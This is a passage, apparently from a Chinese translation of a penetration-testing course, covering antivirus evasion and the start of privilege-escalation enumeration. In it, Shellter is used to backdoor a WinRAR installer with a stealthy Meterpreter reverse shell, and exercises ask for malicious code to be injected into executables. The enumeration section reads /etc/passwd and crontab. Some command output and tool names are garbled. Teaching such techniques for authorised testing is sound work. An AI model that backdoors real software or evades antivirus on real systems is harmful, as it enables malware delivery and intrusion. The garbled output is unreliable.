+02/26/2018 05:55 AM Windows 10 Update Assistant.lnk
+
+02/XX/2018                                     .
+
+               1 File(s)    4,299 bytes
+
+               2 Dir(s)    306,019,840 bytes free
+
+```
+```
+C:\Users\offsec\Desktop> .av_test.ps1
+
+.av_test.ps1 : File C:\Users\offsec\Desktop\av_test.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see Execution_Policies at https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell/?linkID=135170
+
+At line:1:char:1
+
++ CategoryInfo : SecurityError (:)
+
++ FullyQualifiedErrorCode : UnauthorizedAccess
+```
+
+列表 504 - 尝试运行脚本并遇到执行策略错误
+
+快速查看微软关于 PowerShell 执行策略的文档（错误消息中的链接）显示，这些策略是针对用户而非整个系统的。
+
+图 26：PowerShell 中的内存注入未被检测为恶意软件：
+
+根据 VirusTotal 结果，59 个反杀毒软件中只有 2 个检测到了我们的脚本。这看起来很有前景。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+这些系统以及它们认为有害的内容，像上述的脚本可能需要针对目标环境进行修改或适配。
+
+## 17.3.3.2 练习题
+
+- 1. 审查 PowerShell 脚本的代码，并确保你对其工作原理有基本的理解。
+- 2. 使用 PowerShell 为你的 Linux 机器获取一个 meterpreter shell。
+- 3. 尝试使用 PowerShell 单行命令脚本获取反向 shell。
+
+## 17.3.3.3 Shellter
+
+Shellter 是一种动态 shellcode 注入工具，也是最流行的能够绕杀毒软件的免费工具之一。它使用多种先进且有效的技术，将有效的且无害的可执行文件后门化恶意 shellcode 载荷。
+
+虽然 Shelter 所用技术的细节超出了本模块的范围，但它本质上是对目标 PE 文件和执行路径进行彻底分析。它确定了我们可以在哪里注入 shellcode，而不依赖于那些容易被 AV 引擎检测到的传统技术（包括更改 PE 文件节区、创建新节区等）。
+
+最后，Shelter 尝试利用现有的 PE 导入地址表 (`IAT`) 条目来定位用于我们载荷内存分配、传输和执行的函数。
+
+在掌握了一些理论基础后，让我们尝试绕过你当前的杀毒软件。我们将使用 `apt` 在 Kali 中安装 Shelter。
+
+```
+kali@kali:- apt-cache search shelter
+
+shellter - Dynamic shellcode injection tool and dynamic PE injector
+```
+```
+kali@kali:- sudo apt install shelter
+```
+```
+kali@kali:- apt install wine
+```
+
+一旦安装完成，在终端运行 `SHELLTER` 将为我们提供一个在 `wine` 下运行的新控制台。
+
+> 432 (dorkoperator, 2012), https://github.com/dorkoperator/powershell_scripts/blob/master/ps_encoder.py
+> 433 (Shelter, 2019), https://shelterproject.com
+> 434 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Portable_Executable#import_Table
+> 435 https://www.winehq.org/
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+Shellter
+
+图 269：初始 shellter 控制台。
+
+Shellter 可以在自动（Auto）或手动（Manual）模式下运行。在手动模式下，工具将启动我们用于注入的 PE 文件，并允许我们在更细粒度上对其进行操作。我们可以使用这种模式来高度自定义注入过程，或者在自动选择的选项失效时使用。
+
+为了本示例，我们将在提示符处选择‘A’以自动模式运行 Shellter。
+
+接下来，我们必须选择一个目标 PE。Shellter 将分析并修改执行流以注入并执行我们的载荷。对于本示例，我们将使用流行的 WinRAR 工具的 32 位可执行安装程序作为目标 PE。
+
+在任何方式分析和修改原始 PE 之前，Shelter 会先创建该文件的备份：
+
+```
+Shellter
+
+Choose Operation Mode: Auto/Manual (A/M/H): A
+
+PE Target: /home/kali/Desktop/wrar571.exe
+
+***
+
+* Backup: A
+
+***
+
+Backup: Shellter_Backups/wrar571.exe
+
+***
+
+PE Compatibility Information
+
+***
+
+Minimum Supported Windows OS: 5.1
+
+Note: 指目标应用程序运行所需的最低 Windows 版本。此信息直接取自 PE 头，可能并不总是准确。
+```
+
+图 270：在 shellter 中选择目标 PE 并执行备份
+
+一旦 Shellter 找到注入载荷的合适位置，它将询问我们是否要启用隐身模式（Stealth Mode），该模式将尝试在载荷执行后恢复 PE 的执行流。我们将选择启用隐身模式，因为我们希望 WinRAR 安装程序表现正常，以避免任何怀疑。
+
+此时，我们看到了可用载荷的列表。这些包括 meterpreter 等流行选择，但 Shellter 也支持自定义载荷。
+
+图 271：载荷列表
+
+注意，为了确保通过隐身模式的执行流，自定义载荷需要终止。
+
+图 272：shellter 中的载荷选项
+
+鉴于 Avira 检测到了该二进制文件，我们将在 Kali 机器上配置载荷。
+
+| 名称 | 当前设置 | 描述 |
+| :--- | :--- | :--- |
+| EXITFUNC | yes | 退出 |
+| LHOST | 10.0.2.15 | 主机 |
+| LPORT | 4444 | 端口 |
+
+图 273：使用 Avira 扫描恶意 PE
+
+一旦 Shellter 在将载荷注入 PE 之前对其混淆，Avira 基于签名的扫描器就会将其清理。它不再认为该二进制文件是恶意的。一旦我们执行文件，就会看到默认的 WinRAR 窗口，它将无问题地安装软件。回我们的历史显示，在安装完成或取消后，我们成功恢复的 Meterpreter 会话似乎消失了。
+
+这是合理的，因为安装程序的执行已经完成，且进程已终止。为了解决这个问题，我们可以使用自动运行脚本（AutoRunScript）在会话创建后立即迁移我们的 Meterpreter 会话。如果在此连接后重新运行 WinRAR 设置，我们应该会得到不同的结果：
+
+# [+] 成功迁移到进程 4832
+
+```
+meterpreter > getuid
+
+Server username: DESKTOP-T2704CT|offsec
+```
+
+Listing 513 - Migrating the meterpreter into a newly spawned process
+
+
+
+迁移完成后，即使我们完成了 WinRAR 安装过程或取消了安装，会话也将保持激活状态。
+
+## 17.3.3.4 练习题
+
+- 1. 在 WinRAR 可执行文件中注入 meterpreter 反向 shell 载荷。
+- 2. 将二进制文件传输到你的 Windows 客户端，并确保它没有被杀毒软件检测。
+- 3. 运行 WinRAR 安装程序并迁移你的 meterpreter 以防止断开。
+- 4. 尝试使用 Shellter 寻找不同的可执行文件并向它们注入恶意代码。
+
+### 17.4 总结
+
+在本模块中，我们讨论了杀毒软件的作用以及厂商用于检测恶意代码的最常用方法。我们简要解释了涉及不同内存 shell 注入技术的杀毒软件绕过方法，并演示了使用 Shellter 和 PowerShell 成功绕过的方法。
+
+尽管我们在两个示例中都成功绕过了杀毒软件检测，但在恶意软件检测和规避这一主题上我们仅仅是皮毛。为了进一步阅读，并了解恶意软件编写者规避现代防御需要多大的努力，我们鼓励你阅读微软出色的文章《FinFisher 曝光：一名研究员击败陷阱、技巧和复杂虚拟机的故事》。
+
+> 438 (Microsoft, 2018), https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finisher-exposed-a-researchers-tale-of-defeating-traps-and-complex-virtual-machines/
+
+## 权限提升
+
+在渗透测试期间，我们通常以非特权用户的身份获取系统的初始脚点。在这些情况下，我们通常会在展示破坏的完整影响之前尝试获取额外的访问权限。这一过程被称为权限提升，它是一项必要的技能，因为在现代环境中，“直接获取 root”的攻破案例是罕见的。
+
+在本模块中，我们 Windows 和基于 Linux 的目标上拥有非特权用户访问权限，并在这些目标上演示权限提升技术。
+
+虽然由于操作系统版本、补丁水平以及各种其他因素的差异，每个目标都可以被认为是独特的，但仍有一些常见的方法。为了利用这一点，我们将搜索配置错误的服务、二进制文件或服务的文件权限限制不足、直接内核漏洞、以高权限运行的漏洞软件、存储在本地文件中的敏感信息、在执行二进制文件之前提升权限的注册表设置、可能包含硬编码凭据的安装脚本以及许多其他。
+
+### 18.1 信息收集
+
+在攻破目标并以无权限用户身份获取初始脚点后，我们的第一步是尽可能收集有关目标的目标信息。这允许我们能够更好地理解受害机器的性质，并发现权限提升的可能途径。
+
+在本节中，我们将探索手动和自动的信息收集与枚举技术，并讨论各自的优缺点。
+
+### 18.1.1 手动枚举
+
+手动枚举系统可能耗时。然而，这种方法允许进行更多控制，并可以帮助识别自动化工具经常遗漏的奇特权限提升方法。
+
+本模块中的某些命令可能需要根据目标操作系统的版本进行微调。此外，本节中展示的所有命令都不会在克隆客户端上完全复制。
+
+### 18.1.11 枚举用户
+
+在获取目标初始访问时，我们应该识别的首要任务之一是用户上下文。Windows 和 Linux 平台上均可用的 `whoami` 命令是一个很好的起点。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+当不带参数运行运行时，`whoami` 将显示 shell 运行的用户名。在 Windows 上，我们可以将发现的用户名作为 `net user` 命令的参数来收集更多信息。
+
+```
+C:\Users\student>whoami
+
+client251\student
+```
+
+```
+C:\Users\student>net user student
+```
+
+| 用户名 | student |
+| :--- | :--- |
+| 全名 | |
+| 备注 | User's comment |
+| 国家/区域代码 | 000 (System) |
+| 账户活动状态 | Yes |
+| 账户过期时间 | Never |
+| 最后一次设置密码 | 3/31/2018 10:37:55 AM |
+| 密码过期时间 | Never |
+| 可修改密码 | 3/31/2018 10:37:55 AM |
+| 需要密码 | No |
+| 用户可以密码 | Yes |
+| 允许的工作站 | All |
+| 登录脚本 | |
+| 用户配置文件 | |
+| 目录 | |
+| 最后登录 | 11/8/2019 12:56:15 PM |
+| 允许登录时间 | All |
+| 本地组组成 | +Remote Desktop Users <Users |
+| 全局组组成 | +None |
+| 命令完成 | |
+
+### 获取 Windows 用户信息
+
+根据上面的输出，我们以 `student` 身份运行并收集了所属的组信息。在 Linux 系统上，我们可以使用 `id` 命令：
+
+```
+student@debian:- id
+
+uid=1000(student) gid=1000(student)
+```
+
+### 获取 Linux 用户信息
+
+输出显示我们以 `student` 身份操作，其用户标识符 (UID) 和组标识符 (GID) 为 1000。
+
+> 441 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012/
+> 442 (Linux man-pages, 2019), http://man.org/linux/man-pages/id.html
+> 443 (Wikipedia, 2019), https://en.wikipedia.org/wiki/User_identifier
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+要发现系统上的其他用户账户，我们可以在 Windows 系统上使用 `net user` 命令。
+
+```
+C:\Users\student>net user
+
+Administrator           DefaultAccount
+
+Guest                     student           UtilityAccount
+
+命令成功完成。
+```
+
+### 获取 Windows 用户信息
+
+输出显示了其他用户账户，包括 admin 账户。要在 Linux 系统上枚举用户，我们只需读取 `/etc/passwd` 文件。
+
+```
+student@debian:~$ cat /etc/passwd
+
+root:x:0:0:/root:/bin/bash
+
+daemon:x:1:1:/usr/sbin:/bin/nologin
+
+bin:x:2:2:/bin:/usr/sbin:/bin/nologin
+
+proxy:x:13:13:/proxy:/usr/sbin:/bin/nologin
+
+www-data:x:33:33:/var/www:/usr/sbin:/bin/nologin
+
+backup:x:34:34:/var/backups:/usr/sbin:/bin/nologin
+
+list:x:38:38:Mailing List:/var/list:/usr/sbin:/bin/nologin
+
+irc:x:39:39:/var/run/ircd:/usr/sbin:/bin/nologin
+
+speech-dispatcher:x:108:29:Speech Dispatcher:/var/run/speech-dispatcher:/bin/false
+
+sshd:x:169:65534::/var/run/sshd:/usr/sbin:/bin/nologin
+
+wprd:x:114:120::/var/run/xp:/bin/false
+
+student:x:1000:1000:Student,PWK:/home/student:/bin/bash
+
+mysql:x:115:121:/MySQL Server:/nonexistent:/bin/false
+```
+
+### 获取 Linux 账户信息
+
+密码文件列出了多个账户，包括目标机器上各种服务使用的 `www-data` 账户，这表明可能是一个 Web 服务器。在目标机器上枚举用户可以识别我们可以用于提升权限的潜在高权限账户。
+
+### 18.1.1.2 枚举主机名
+
+机器的主机名通常可以提供其功能角色的线索。大多数情况下，主机名会标识缩写，例如 `web` 代表 Web 服务器，`db` 代表数据库服务器，`dc` 代表域控制器等。我们可以使用命名良好的 `hostname` 命令发现主机名，该命令在 Windows 和 Linux 上都有。让我们先在 Windows 上运行：
+
+```
+C:\Users\student>hostname
+
+client251
+```
+
+然后在 Linux 上运行：
+
+```
+student@debian:~$ hostname
+
+debian
+```
+
+
+
+### 获取 Linux 主机名信息
+
+Windows 机器相当通名称指向了一个可能的命名规范，网络可以帮助我们找到额外的工作站，而 Linux 客户端的主机名提供了有关未使用操作系统（Debian）的信息。识别机器的角色有助于集中我们的信息收集工作。
+
+#### 18.1.1.3 枚举操作系统版本和架构
+
+在权限提升的某个阶段，我们可能需要依赖 `kernel` 漏洞，这些漏洞专门利用目标操作系统核心的漏洞。此类漏洞是为非常特定的目标构建的，该目标由特定的操作系统和版本组合指定。使用不匹配的内核漏洞攻击目标可能会导致不稳定（导致丢失访问权限），我们必须收集有关目标的精确信息。
+
+在 Windows 操作系统上，我们可以使用 `systeminfo` 工具收集特定的操作系统和架构信息。我们还可以使用 `findstr` 的一些标记来过滤输出。具体来说，可以使用 `/B` 匹配行首，并使用 `/C` 指定特定的搜索字符串。在示例中，我们使用这些标记提取操作系统的名称（Name）以及版本（Version）和架构（System）。
+
+```
+C:\Users\student>systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+OS Name: Microsoft Windows 10 Pro
+
+OS Version: 10.0.16299 N/A Build 16299
+
+System Type: x86-based PC
+```
+
+### 获取运行中操作系统的版本和架构
+
+> 444 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname
+> 445 (Peter Tobias, 2023), https://linux.die.de/man/1/hostname
+> 446 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Kernel_(operating_system)
+> 447 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo
+
+# 使用 Kali Linux 进行渗透测试
+
+输出显示目标系统正在运行 x86 架构上的 Windows 10 专业版 10.0.16299 版本。
+
+在 Linux 上，`/etc/issue` 和 `/etc/release` 文件包含类似的信息。我们还可以执行 `uname -a` 命令：
+
+```bash
+student@debian:~$ cat /etc/issue
+
+Debian GNU/Linux 9 |
+```
+
+```bash
+student@debian:~$ cat /etc/release
+
+PRETTY_NAME=Debian GNU/Linux 9 (stretch)
+
+NAME=Debian GNU/Linux
+
+VERSION_ID=9
+
+VERSION="stretch"
+
+ID=debian
+```
+
+```bash
+student@debian:~$ uname -a
+
+Linux debian 4.9.0-6-6+deb93 (2018-03-02) #1686 GNU/Linux
+```
+
+列表 521：获取运行的操作系统版本和架构
+
+位于 `/etc` 目录下的文件包含操作系统版本（Debian 9），而 `uname -a` 输出内核版本（4.9.0-6）和（i686 / x86）。
+
+## 18.1.1.4 列举运行中的进程和服务
+
+接下来，让我们看看可能允许我们提升权限的运行进程和和服务。要发生这种情况，进程必须在特权账户的上下文中运行，并且具有不安全的权限，或者允许我们与其非预期的用途进行交互。
+
+我们可以在 Windows 上使用 `tasklist` 命令列出进程。`/SVC` 标志将返回映射到特定 Windows 服务的进程。
+
+| 映像名称 | PID | 服务 |
+| :--- | :--- | :--- |
+| . . . | | |
+| lsass.exe | 564 | KeyInfo, Netlogon, SamSs, VaultSvc |
+| svchost.exe | 676 | BrokerInfrastructure, DcomLaunch, LSM, PlugPlay, Power, SystemEventsBroker |
+| fontdrvhost.exe | 684 | N/A |
+| fontdrvhost.exe | 692 | N/A |
+| svchost.exe | 776 | RpcEtMapper, RpcSs |
+| dwm.exe | 856 | N/A |
+| svchost.exe | 944 | WinMg, BITS, Dsmsvc, gpspc, IKEEXT, lplpsvc, LanmanServer, lfsvc, ProfSvc, Schedule, SENS, SessionEnv, ShellHwDetection, Themes, TokenBroker, UserManager, winmgmt, WpnService |
+| svchost.exe | 952 | TermService |
+| svchost.exe | 960 | BFE, CoreMessagingRegistrar, DPS, Mpsvc |
+| chost.exe | 988 | Dhcp, EventLog, lmhosts, TimeBrokerSvc, WinHttpProxySvc, wscsvc |
+
+```bash
+mysqld.exe 1816 mysql
+```
+
+列表 522：获取操作系统上运行的进程列表并匹配的服务
+
+输出显示 MySQL 服务正在机器上运行，这在适当条件下可能会引起关注。
+
+请注意，此输出没有列出特权用户的进程。在 Windows 系统上，我们需要高权限才能收集这些信息，这使得过程变得更加困难。
+
+在 Linux 上，我们可以使用 `ps` 命令列出系统进程（包括特权用户的进程）。我们使用 `a` 和 `x` 标志列出所有进程，或使用 `u tty45` 标志以用户可读的格式列出进程。
+
+```bash
+student:~$ ps axu
+
+USER PID %CPU %MEM RSS START TIME COMMAND
+
+root 1 0.0 0.6 28032 6256 S Nov7 0:00 /sbin/init
+
+root 2 0.0 0.0 0 0 ? S Nov7 0:00 [kthread]
+
+root 254 0.0 0.9 54536 9924 S Nov7 1:45 /usr/bin/vmftools
+
+root 255 0.0 0.0 0 0 ? S Nov7 0:00 [kaudit]
+
+root 259 0.0 0.4 25952 5180 S Nov7 0:01 /lib/system/systemd
+
+root 294 0.0 0.4 17896 4095 S Nov7 0:00 /lib/system/systemd-udev
+
+systemd+ 390 0.0 0.3 16884 3950 Nov7 0:00 /lib/system/systemd-timesd
+
+root 514 0.1 1.5 52364 16272 Ss Nov7 0:00 /usr/bin/VGAAuthService
+
+root 515 0.0 0.2 5256 2816 S Nov7 0:00 /sbin/cron
+
+message+ 518 0.0 0.3 6368 3089 Nov7 0:37 /usr/bin/dbus-daemon
+
+trt 523 0.0 0.3 24096 3156 S Nov7 0:09 /lib/system/dbus-daemon
+
+student 8868 0.0 0.3 7664 3336 0:25 ps axu
+```
+
+列表 523：获取 Linux 中以 root 运行的进程
+
+输出列出了值得搜索的以 root 运行的进程。注意输出中也列出了 `ps` 命令。分析的下一步是检查可用接口、路由和开放端口。这些信息可以帮助我们确定目标是否连接到多个网络。此外，特定接口的存在可能指示虚拟化软件的存在。攻击者可能利用目标作为跳板在网络之间移动。调查环回接口上的特权服务可能会扩大我们的攻击面并增加权限提升的概率。我们可以通过 `ipconfig /all` 在 Windows 操作系统上开始收集完整的 TCP/IP 配置。
+
+```cmd
+C:\Users\student>ipconfig /all
+```
+
+
+
+Windows IP 配置 |
+| :--- | :--- |
+| Host Name | client |
+| DNS Suffix | corp |
+| Node Type | Hybrid |
+| IP Routing | No |
+| WINS Proxy | No |
+| DNS Suffix | corp |
+| Ethernet adapter Ethernet0: | |
+| Connection-specific Suffix | Intel(R) 82574 Gigabit Connection |
+| Physical Address | 00-0C-29-ED-80 |
+| DHCP Enabled | No |
+| Autoconfiguration | Yes |
+| Link-local IPv6 Address | fe80::bc64:a10f:ed9c15 (Preferred) |
+| IPv4 Address | 10.1.0.22 (Preferred) |
+| Subnet Mask | 255.255.255.0 |
+| Ethernet adapter Ethernet1: | |
+| Connection-specific Suffix | Intel(R) 82574 Gigabit Connection #2 |
+| Physical Address | 00-0C-29-ED-BA8 |
+| DHCP Enabled | No |
+| Autoconfiguration | Yes |
+| Link-local IPv6 Address | fe80::d93e:158a:241b:beb7c4 (Preferred) |
+| IPv4 Address | 192.168.1.111 (Preferred) |
+| Subnet Mask | 255.255.255.0 |
+
+列表 524：列出 Windows 上所有适配器的完整 TCP/IP 配置
+
+这台机器有多个网络接口。接下来，让我们看看路由表。要显示路由表，我们使用 `route` 命令后接 `print` 参数。
+
+```cmd
+C:\Users\student>route print
+=======================================================
+Interface List
+=======================================================
+15..00 09c-21-ed b0 ......Intel(R) 82574L Gigabit Network Connection
+4..00 09c-21-ed b0 ......Intel(R) 82574L Gigabit Network Connection #2
+1...............Software Loopback Interface 1
+```
+
+# IPv4 路由表
+
+活动路由:
+| Network Destination | Netmask | Interface | Metric |
+| :--- | :--- | :--- | :--- |
+| 0.0.0.0 | 0.0.0.0 | 192.168.1.1 10.168.1.111 | 281 |
+| 0.0.0.0 | 0.0.0.0 | 10.10.0.22 | 281 |
+| 10.10.0.22 | 255.255.255 | On-link | 281 |
+| 10.10.0.255 | 255.255.255 | On-link | 281 |
+| 127.0.0.0 | 255.255.255 | 127.0.0 | 331 |
+| 127.0.0.1 | 255.255.255 | 127.0.1 | 331 |
+| 192.168.1.0 | 255.255.255 | 192.168.1.111 | 281 |
+| 192.168.1.1 | 255.255.255 | 192.168.1.111 | 281 |
+| 192.168.1.255 | 255.255.255 | 192.168.1.111 | 281 |
+
+# IPv6 路由表
+
+活动路由：
+
+| 接口 | 度量 | 网络目的 | 网关 |
+|---|---|---|---|
+| 1 | 331 | ::1/128 | 直接连接 |
+| 4 | 281 | fe80::64 | 直接连接 |
+| 15 | 281 | fe80::64 | 直接连接 |
+| 4 | 281 | fe80::93d3:158a:241b:beb7/128 | 直接连接 |
+| 15 | 281 | fe80::bc64:ab2f:a10f:edc9/128 | 直接连接 |
+| 1 | 331 | ff00::8 | 直接连接 |
+| 4 | 281 | ff00::8 | 直接连接 |
+| 15 | 281 | ff00::8 | 直接连接 |
+
+持久性路由：
+
+无
+
+最后，我们使用 `netstat` 来查看网络连接。指定标志将显示所有 TCP 连接，`n` 标志允许我们以数字格式显示地址和端口号，而 `o` 标志将显示每个连接的所有者 PID。
+
+```
+C:\Users\student>netstat -ano
+```
+
+# 活跃连接
+
+| 协议 | 本地地址 | 地地址 | 状态 | PID |
+|---|---|---|---|---|
+| TCP | 0.0.0.0:80 | 0.0.0.0:0 | 监听 | 7432 |
+| TCP | 0.0.0.0:135 | 0.0.0.0:0 | 监听 | 776 |
+| TCP | 0.0.0.0:445 | 0.0.0.0:0 | 监听 | 4 |
+| TCP | 0.0.0.0:3386 | 0.0.0.0:0 | 监听 | 1472 |
+| TCP | 0.0.0.0:3389 | 0.0.0.0:0 | 监听 | 952 |
+| TCP | 0.0.0.0:8895 | 0.0.0.0:0 | | 2284 |
+| TCP | 0.0.0.0:9121 | 0.0.0.0:0 | 监听 | 7432 |
+| TCP | 127.0.0.1:49689 | 127.0.0.1:49690 | 已建立 | 2284 |
+| TCP | 127.0.0.1:49690 | 127.0.0.1:49689 | 已建立 | 2284 |
+| TCP | 127.0.0.1:49691 | 127.0.0.1:49692 | 已建立 | 2284 |
+| TCP | 127.0.0.1:49692 | 127.0.0.1:49691 | 已建立 | 2284 |
+
+> 列表 526 - 在 Windows 操作系统上列出所有网络连接
+
+`netstat` 不仅为我们提供了机器监听端口的列表，还包含了关于已连接的信息，这些信息可以揭示连接到我们以后目标机器的其他用户。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+在基于 Linux 的主机上可以使用类似的命令。根据 Linux 的版本，你可以使用 `ifconfig` 或 `ip` 列出每个网络适配器的 TCP/IP 配置。这两个命令都接受 `a` 标志，以显示所有可用信息。
+
+```
+$student@debian:~$ ip a
+```
+
+```
+ens192:BROCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc pfifo_fast state UP group default
+link/ether 00:50:56:a4:d8:ff:ff:ff:ff:ff
+inet 10.168.1.124/28 br 192.168.1.1 scope global ens192
+valid_ft lifetime preferred
+inet6 fe80::25ff:feba:4d0/64 scope link
+valid_ft lifetime preferred
+ens224:BROCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc pfifo_fast state UP group default
+link/ether 00:50:56:c5:be:ff:ff:ff
+inet 192.168.1.112/24 br 192.168.1.255 scope global ens224
+valid_ft lifetime preferred
+inet6 fe80::25ff:feba:ce/64 scope link
+valid_ft lifetime preferred
+```
+
+> 图 527 - Linux 上所有适配器上的 TCP/IP 配置
+
+根据输出，Linux 客户端也连接到了多个网络。根据 Linux 的发行版和版本，我们可以使用 `route` 命令发现路由表。
+
+```
+$student@debian:~$ /sbin/route
+内核路由表
+```
+
+
+
+| 目的 | 网关 | 子网掩码 | 标志 | 使用 |
+|---|---|---|---|---|
+| 默认 | 192.168.1.255 | 0.0.0.0 | UG | 0 |
+| 192.168.1.0 | 0.0.0.0 | 255.255.255.0 | U | 0 |
+| 127.0.0.0 | 0.0.0.0 | 255.0.0.0 | UG | 0 |
+
+# 计划任务
+
+## 18.1.1.7 列举计划任务
+
+攻击者经常在权限提升攻击中利用计划任务。
+
+作为服务器运行的系统通常带有调度系统，这些调度系统的语法往往有些复杂，用于执行用户创建的可执行文件或脚本。当这些系统配置不当，导致用户创建的文件留有不安全的权限时，我们可以修改这些将由调度系统以高权限级别执行的任务。
+
+我们可以使用 `schtasks` 命令在 Windows 上创建和查看计划任务。`query` 参数显示任务，而 `FO LIST` 将输出格式设置为简单列表。我们还可以使用 `/V` 来请求详细信息。
+
+```
+c:\Users\student>schtasks /query /fo LIST /v
+```
+
+Folder:\
+INFO: 您的访问级别下当前没有可用的计划任务。
+
+Folder:\Microsoft\
+INFO: 您的访问级别下当前没有可用的计划任务。
+
+| Folder:\Microsoft\Office |
+| :--- | :--- |
+| HostName: | CLIENT251 |
+| TaskName: | \Microsoft\Office|Office 15 Subscription Heartbeat |
+| Next Run Time: | 11/12/2019 03:18:24 AM |
+| Status: | Interactive/Background |
+| Logon Mode: | Ready |
+| Last Run Time: | 11/11/2019 03:49:25 AM |
+| Last Result: | 0 |
+| Author: | Microsoft Office |
+| Task To Run: | ice1\Licenseheartbeat.exe%ProgramFiles%\Common Files\Microsoft Shared\Off |
+| Start In: | N/A |
+| Comment: | description is current. Task used to ensure the Microsoft Office Su |
+| Scheduled Task State: | Enabled |
+| Idle Time: | Disabled |
+| Power Management: | Stop On Battery Mode |
+| Run As: | SYSTEM |
+| Delete Task If Not Resched: | Disabled |
+| Stop Task If Runs X Hours and Mins: | 04:00:00 |
+| Schedule: | Scheduling data is not available in this format |
+| Scheduled Type: | Daily |
+| Start Time: | 12:00:00 AM |
+| Start Date: | 1/1/2010 |
+| End Date: | N/A |
+| Days: | Every 1 days |
+| Months: | N/A |
+| Repeat: Every: | Disabled |
+| Repeat: Until Time: | Disabled |
+
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/schtasks/schtasks
+
+# 攻击性安全
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+Repeat: Until: Disabled
+Repeat: Stop If Running: Disabled
+
+列表 532 - 列出所有要执行任务的计划任务，
+
+`schtasks` 任务的输出包含许多有用信息，例如要执行的任务、下次运行时间、上次运行时间以及关于运行频率的细节。
+
+基于 Linux 的作业调度器被称为 Cron。计划任务列在 `/etc/cron/` 目录下，其中 `*` 代表任务运行的频率。例如，每天运行的任务可以在 `/etc/cron.daily` 下找到。每个脚本都列在其子目录中。
+
+```
+$student@debian:-$ ls -lh /etc/cron/
+```
+
+```
+-rw-r--r-- 1 root root      722 Oct  7 2017 crontab
+```
+
+```
+/etc/cron:
+```
+
+```
+-rw-r--r-- 1 root root      285 May 29 2017 anacron
+-rw-r--r-- 1 root root      712 Jan  1 2017 php
+-rw-r--r-- 1 root root      102 Oct  7 2017 .placeholder
+```
+
+```
+/etc/cron.daily:
+```
+
+```
+-rw-xrxr-x 1 root root      311 May 29 2017 anacron
+-rw-xrxr-x 1 root root      539 Mar 00 2018 apache2
+-rw-xrxr-x 1 root root      155 Sep 13 2015 apt-compat
+-rw-xrxr-x 1 root root      355 Oct 25 2016 bsdutils
+-rw-xrxr-x 1 root root      384 Dec 02 2012 crackclib-runtime
+-rw-xrxr-x 1 root root      166 Feb 22 2012 dldpkg
+-rw-xrxr-x 1 root root       89 May  5 2015 logrotate
+-rw-xrxr-x 1 root root      111 Dec 13 2016 man-db
+-rw-xrxr-x 1 root root      249 May 17 2016 passwd
+-rw-r--r-- 1 root root      102 Oct  7 2017 .placeholder
+```
+
+```
+/etc/cron.hourly:
+```
+
+```
+-rw-r--r-- 1 root root      102 Oct  7 2017 .placeholder
+```
+
+```
+/etc/cron.monthly:
+```
+
+```
+-rw-xrxr-x 1 root root      313 May 29 2017 anacron
+-rw-xrxr-x 1 root root      102 Oct  7 2017 .placeholder
+```
+
+```
+/etc/cron.weekly:
+```
+
+```
+-rw-xrxr-x 1 root root      312 May 29 2017 anacron
+-rw-xrxr-x 1 root root      723 Dec 13 2016 man-db
+-rw-r--r-- 1 root root      102 Oct  7 2017 .placeholder
+```
+
+列表 533 - 列出 Linux 上所有的 cron 任务
+
+列出目录内容，注意到几个每天运行的任务。值得注意的是，系统管理员经常在 `/etc/crontab` 文件中添加计划任务。这些任务应该仔细检查权限，因为大多数任务将以 root 身份运行。
+
+> (Wikipedia, 2019), https://en.wikipedia.org/Cron
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+student@debian:~$ cat /crontab
+```
+
+```
+...
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/usr/bin
+17 * * * root      cd && run-report /etc/cron.hourly
+25 6 * * root      test -x /sbin || cd && run-report /etc/cron.daily
+6 6 * * root      test -x /sbin || cd && run-report /etc/cron.weekly
+52 1 * * root      test -x /sbin || cd && run-report /etc/cron.monthly
+0 * * * root      /var/scripts/user_backups.sh
+```
+
+
+
+列表 534 - `/crontab` 文件示例
+
+此示例显示了一个以 root 运行的备份脚本。如果该文件权限允许，我们就可以利用它提升权限。
+
+## 18.1.1.8 列举已的应用和补丁级别
+
+某些情况下，我们需要利用漏洞来提升本地权限。因此，手动搜索所有安装的应用并记录操作系统补丁级别可能是耗时且低效的。然而，我们可以利用强大的 Windows 工具 `wmic` 来自动化这一过程。
+
+`wmic` 工具提供了 Windows 映像接口（WMI），它是 Windows 管理数据和操作的基础。我们可以使用 `wmic product get` 来获取特定的属性值。然后我们可以选择感兴趣的属性：`name`、`version` 和 `vendor`。
+
+需要注意的是，`product` `wmic` 类仅列出由 Windows 安装程序安装的应用。
+
+```
+c:\student>wmic product get name, version, vendor
+```
+
+| Name | Vendor | Version |
+| :--- | :--- | :--- |
+| Microsoft OneNote (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft OSM (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Office Standard 2016 | Microsoft Corporation | 16.0.4266.1081 |
+| Office DSM MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Office Shared Setup MUI 2016 | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Excel MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft PowerPoint MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Publisher MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Outlook MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Groove MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
